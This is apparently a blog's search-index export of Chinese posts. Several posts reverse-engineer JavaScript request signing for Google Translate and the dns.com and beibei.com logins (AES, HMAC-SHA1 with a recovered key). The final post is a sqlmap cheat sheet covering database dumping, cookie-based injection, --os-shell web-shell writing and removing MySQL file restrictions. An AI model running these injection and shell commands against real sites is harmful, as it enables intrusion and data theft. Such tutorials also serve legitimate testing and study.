<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JS逆向系列一</title>
    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/</url>
    <content><![CDATA[<h3 id="谷歌学术镜像">谷歌学术镜像</h3>
<p>目标网址：<a href="https://ac.scmor.com/" target="_blank" rel="noopener">https://ac.scmor.com/</a></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174729.png" alt=""></p>
<p>目的是爬取学术镜像的真实地址，在Elements视图下，观察<code>现在访问</code>a标签，发现启用了onclick事件，调用了<code>visit()</code>函数，函数内的内容，猜测就是加密后的真实URL地址。</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174922.png" alt=""></p>
<p>全局搜索<code>visit</code>,在 <a href="https://ac.scmor.com/res/?f=run&amp;v=1590682984" target="_blank" rel="noopener">https://ac.scmor.com/res/?f=run&amp;v=1590682984</a> 中，找到了<code>visit</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531175244.png" alt=""></p>
<p>经过观察，猜测<code>strdecode</code>是解密函数，就在上几行的位置，有个可疑参数<code>autour[b]</code>，猜测是URL地址，在Console中测试一下</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180634.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180730.png" alt=""></p>
<p>经测试，<code>autour</code>是个数组，里面存放了加密后的真实地址，<code>strdecode</code>也的确是解密函数，现在去拉取<code>strdecode</code>函数具体内容<br>
全局搜索，找到了<code>strdecode</code>，经过初步观察，是Base64加密，然后缺啥补啥，将加密函数完整的提取出来</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181249.png" alt=""></p>
<p>到此，加密函数也有了，现在需要收集全部的URL，于是，之前的<code>autour</code>数组，也拉下来，现在只需要遍历一下就好了，刚好有个<code>run</code>函数就是For循环遍历<code>autour</code>数组，也拿下来</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181940.png" alt=""></p>
<p>稍微修改下细节，就大功告成，效果图如下：</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531182151.png" alt=""></p>
<h3 id="DNS-COM"><a href="http://DNS.COM" target="_blank" rel="noopener">DNS.COM</a></h3>
<p>目标网址：<a href="https://www.dns.com/login.html" target="_blank" rel="noopener">https://www.dns.com/login.html</a></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011619.png" alt=""></p>
<p>随便输入帐号密码进行测试，发现有个XHR请求，里面的<code>password</code>，<code>email</code>两个请求参数都做了加密，猜测这就是刚才输入的帐号密码</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011947.png" alt=""></p>
<p>全局搜索 <code>password</code>,通过在后面加上 : 或者 = 可以缩小范围，排除多余项，找到了<code>password:</code>的位置，现在其实已经很明显是AES加密了，但还是测试一下吧</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012327.png" alt=""></p>
<p>打断点，重新登陆，果然进入debugger状态了。</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012821.png" alt=""></p>
<p>然后在console中测试下<code>aes()</code>函数以及它的参数到底是什么，经验证，发现<code>aes()</code>正是一个加密函数，加密后的内容和一开始看到的相吻合</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601013000.png" alt=""></p>
<p>现在查看<code>aes</code>函数具体的内容，发现了又有<code>k</code>和<code>iv</code>，并且有个CryptoJS对象</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601095717.png" alt=""></p>
<p>全局搜索CryptoJS，发现了<code>crypto-js.js</code>文件，明显这是CryptoJS加密库</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601100429.png" alt=""></p>
<p>并且发现还用了<code>$(selector).action()</code>的jQuery语法，所以还需要载入jQuery库</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601112445.png" alt=""></p>
<p>从网上下载单独的CryptoJS库文件引入，从 网页中获取jQuery链接，并载入 jQuery，然后将<code>aes</code>函数也拉下来</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113127.png" alt=""></p>
<p>效果图如下：</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113229.png" alt=""></p>
<h3 id="贝贝网">贝贝网</h3>
<p>目标网址：<a href="https://m.beibei.com/login/login.html" target="_blank" rel="noopener">https://m.beibei.com/login/login.html</a> （需手机端）</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601154549.png" alt=""></p>
<p>输入帐号密码及验证码进行测试，发现一个XHR请求，类型为POST，提交的表单数据中的用户名密码都为明文，但问题在于请求参数中的<code>_abr_</code>一直在变化，猜测它为加密参数</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601155448.png" alt=""></p>
<p>全局搜索<code>_abr_</code>无果，只能打请求断点，成功断住</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601160354.png" alt=""></p>
<p>但是发现断点的位置没有我们要的内容，于是在call Stack中往下找调用栈，call Stack内的方法调用栈的规则是从上到下由最新调用处依次往下排列。在<code>e.ajax</code>中发现了包含有<code>_abr_</code>的内容，但是这里是要发送出去了，没有它的产生过程，于是继续往下找，终于找到了<code>_abr_=</code></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163002.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163301.png" alt=""></p>
<p>记录<code>_abr_</code>的值为：“013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1”<br>
发现<code>_abr_</code>其实是由<code>m(e.type, e.uri.pathname, e.query, e.form)</code>函数生成，于是为了了解它的生成过程，在函数前打上断点，重新发送登陆请求</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165214.png" alt=""></p>
<p>单步跟踪，发现了关键函数<code>MD5</code></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165852.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601170350.png" alt=""></p>
<p>继续单步跟踪，又发现了一个关键函数<code>HMAC</code></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171039.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171405.png" alt=""></p>
<p>网上查找资料了解这个加密算法，发现HMAC算法，需要一个信息摘要算法以及一个密钥，在下方又找到关键函数<code>HmacSHA1</code>，于是推测使用了SHA-1算法</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171755.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601185857.png" alt=""></p>
<p>经过长时间的单步跟踪，总算来到了一开始的函数返回值部分</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601174129.png" alt=""></p>
<p>现在，我们开始分析，HMAC算法可以使用Python第三方库实现，先尝试一下。加密内容有了，密钥也有了（加密目标值可以用<code>JSON.stringify()</code>提取）<br>
加密目标值：“01\nPOST\nb7da15fd7cdc2b8c73958ee82e7424aa\n/mroute.html?method=beibei.user.token.get\n1591002077”<br>
密钥：“ytU7vwqIx2UXQNsi”</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601190441.png" alt=""></p>
<p>Python测试效果如下</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191001.png" alt=""></p>
<p>但是发现，与<code>_abr</code>的值相较，少了一些内容，回过头观察，发现<code>_abr</code>的值由<code>a+m+h</code>组成，<code>a</code>经测试是固定值<code>01</code>，<code>m</code>就是经过HMAC加密后的值，<code>h</code>会变动且暂时还不清楚</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191307.png" alt=""></p>
<p>对<code>h</code>进行分析，发现是由<code>s</code>的值使用<code>toString(16)</code>函数变化而来，而<code>s</code>则是时间戳(<code>new Date</code>)变化而来</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191707.png" alt=""></p>
<p>提取出<code>h</code>的算法，测试了一下，成功</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601194144.png" alt=""></p>
<p>接下来，只剩下需要加密的值，它如何产生的，观察发现由<code>a + &quot;\n&quot; + e + &quot;\n&quot; + f + &quot;\n&quot; + p + &quot;\n&quot; + s</code>组成，<code>a</code>、<code>s</code>都清楚了，<code>e</code>发现是<code>POST</code>，<code>p</code>是路径<code>/mroute.html?method=beibei.h5.login</code>，这两个也是固定值，只剩下<code>f</code>是MD5加密后的值，逆向<code>f</code>的产生过程，发现是由&quot;用户名+路径+登陆id&quot;产生而来，如：<code>username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010</code><br>
所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现</p>
<p>最终完成的效果<br>
<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601195839.png" alt=""></p>
]]></content>
      <categories>
        <category>JS逆向</category>
      </categories>
      <tags>
        <tag>JS逆向系列</tag>
      </tags>
  </entry>
  <entry>
    <title>JS逆向系列之谷歌翻译</title>
    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</url>
    <content><![CDATA[<h3 id="一、逆向谷歌翻译">一、逆向谷歌翻译</h3>
<h4 id="分析过程">分析过程</h4>
<ul>
<li>首次分析</li>
</ul>
<p>首先找到谷歌翻译的Ajax请求接口</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p>
<p>以get方式发送的Ajax请求，多次尝试，发现请求参数中，<code>tk</code>和<code>q</code>，是不断变化的，其中<code>q</code>是待翻译的内容，<code>tk</code>是根据<code>q</code>进行js加密算法生成的，所以我们要分析<code>tk</code>的产生。</p>
<ul>
<li>通过断点逆向<code>tk</code>的加密算法</li>
</ul>
<p>加密算法应该在translate_m_zh-CN.js文件里</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p>
<p>打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p>
<p>依次往下点击每一个调用的函数，当到了QE函数的时候，发现了<code>tk</code>参数来自b，b又明显来自c</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p>
<p>于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p>
<ul>
<li>分析生成<code>tk</code>的JS代码</li>
</ul>
<p>如下是我们刚获取的JS代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">"a"</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">"+"</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">"+"</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">""</span>) || <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">"&amp;"</span> + d.join(<span class="string">""</span>) + <span class="string">"="</span>;</span><br><span class="line">    d = b.split(<span class="string">"."</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">"+-a^+6"</span>);</span><br><span class="line">    a = nu(a, <span class="string">"+-3^+b+-f"</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">"."</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>发现做了很多不必要的操作、甚至多此一举，目的是用于混淆<br>
如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还用了<code>.fromCharCode()</code>函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现<code>tk</code>生成需要另一样东西，就是<code>tkk</code>这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p>
<h4 id="具体实现">具体实现</h4>
<p>说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可</p>
<ul>
<li>Python脚本</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'google_tk.js'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.compile(js)</span><br><span class="line">    tk = j.call(<span class="string">'pu'</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span><span class="params">()</span>:</span></span><br><span class="line">    q = input(<span class="string">"请输入你要翻译的内容："</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"user-agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"referer"</span>: <span class="string">"https://translate.google.cn/"</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">"https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk="</span> + get_tk(</span><br><span class="line">        q) + <span class="string">"&amp;q="</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    translate_google()</span><br></pre></td></tr></table></figure>
<ul>
<li>tk.js</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tkk = '441865.2154418832';</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">"a"</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">"+"</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">"+"</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">'441865.2154418832'</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">"+-a^+6"</span>);</span><br><span class="line">    a = nu(a, <span class="string">"+-3^+b+-f"</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">"."</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="运行效果">运行效果</h4>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p>
<h3 id="二、总结常见算法的加密原理">二、总结常见算法的加密原理</h3>
<ul>
<li>散列(hash)函数算法：MD5、SHA</li>
<li>对称加密算法：DES、3DES、AES</li>
<li>非对称性加密算法：RSA、DSA、ECC</li>
</ul>
<h4 id="散列-hash-函数算法">散列(hash)函数算法</h4>
<ul>
<li>简介</li>
</ul>
<p>Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure>
<ul>
<li>特点</li>
</ul>
<p>一、不可逆，与原视数据没有对应关系<br>
二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值<br>
三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况</p>
<h4 id="对称加密算法">对称加密算法</h4>
<ul>
<li>简介</li>
</ul>
<p>秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密)</p>
<h4 id="非对称性加密算法">非对称性加密算法</h4>
<ul>
<li>简介</li>
</ul>
<p>秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高</p>
]]></content>
      <categories>
        <category>JS逆向</category>
      </categories>
      <tags>
        <tag>JS逆向系列</tag>
      </tags>
  </entry>
  <entry>
    <title>SqlMap总结</title>
    <url>/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="SqlMap测试基本流程">SqlMap测试基本流程</h2>
<blockquote>
<p>sqlmap -u “url”<br>
sqlmap -u URL –dbs<br>
sqlmap -u URL -D database –tables<br>
sqlmap -u URL -D database -T tablename –columns<br>
sqlmap -u URL -D database -T tablename -C columnsname –dump</p>
</blockquote>
<h2 id="SqlMap常用命令">SqlMap常用命令</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">-–batch 默认选项运行</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">–dbms 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例</span><br><span class="line">--proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads&#x3D;                       使用多少线程</span><br><span class="line">–fresh-queries fresh-queries会忽略之前的查询结果,进行重新请求操作</span><br><span class="line">–flush-session flush-session会清空当前URL相关的session</span><br><span class="line">–level 设置检测的方方面面和测试用例</span><br><span class="line">    - 默认是1,会尝试POST和GET</span><br><span class="line">    - 2:Cookie也会加入检测</span><br><span class="line">    - 3:User-Agent和Referer也会检测, 更大的值会增加用例量</span><br><span class="line">-–technique 指定sqlmap使用的检测技术</span><br><span class="line">    B:Boolean-based-blind （布尔型注入）</span><br><span class="line">    U:Union query-based （联合注入）</span><br><span class="line">    E:Error-based （报错型注入)</span><br><span class="line">    S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</span><br><span class="line">    T:Time-based blind （基于时间延迟注入）</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL新特性secure-file-priv对读写文件的影响">MYSQL新特性secure_file_priv对读写文件的影响</h2>
<p>secure-file-priv是在Mysql5.7版本后引入的新特性，secure-file-priv参数是用来限制导入导出传到哪个指定目录</p>
<ul>
<li>当配置文件内没有secure-file-priv参数，表示限制mysqld 不允许导入|导出</li>
<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
</ul>
<p>解决方法：<br>
windows下：修改my.ini 在[mysqld]内加入secure_file_priv =<br>
linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>
之后需重启Mysql</p>
<h2 id="SqlMap技巧">SqlMap技巧</h2>
<h3 id="抓包注入">抓包注入</h3>
<p>从bp抓包文件中检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot;</span><br></pre></td></tr></table></figure>
<h3 id="指定检测参数">指定检测参数</h3>
<ul>
<li>-p 参数名</li>
<li>参数后面加上<code>*</code>d</li>
</ul>
<h3 id="伪静态注入">伪静态注入</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot;</span><br></pre></td></tr></table></figure>
<h3 id="需要登陆的注入">需要登陆的注入</h3>
<p>利用cookie参数注入，也可以使用抓包注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot;</span><br></pre></td></tr></table></figure>
<h3 id="交互式shell">交互式shell</h3>
<p>写文件的两个前提：</p>
<ol>
<li>获取网站的绝对路径</li>
<li>拥有足够的权限<code>dba/root</code></li>
</ol>
<p>首先判断当前是否为dba权限</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133450.png" alt=""></p>
<p>开始写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --os-shell</span><br></pre></td></tr></table></figure>
<p>选择shell脚本类型，接着输入路径，写入成功就进入一个交互式的shell命令行，还会返回一个上传文件的路径，也就是写入了2个shell，一个用来执行命令，另一个用来上传，其中上传shell的文件名为tmpugppx.php，出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133910.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622134053.png" alt=""></p>
<h3 id="文件读写">文件读写</h3>
<p>读文件需要知道路径</p>
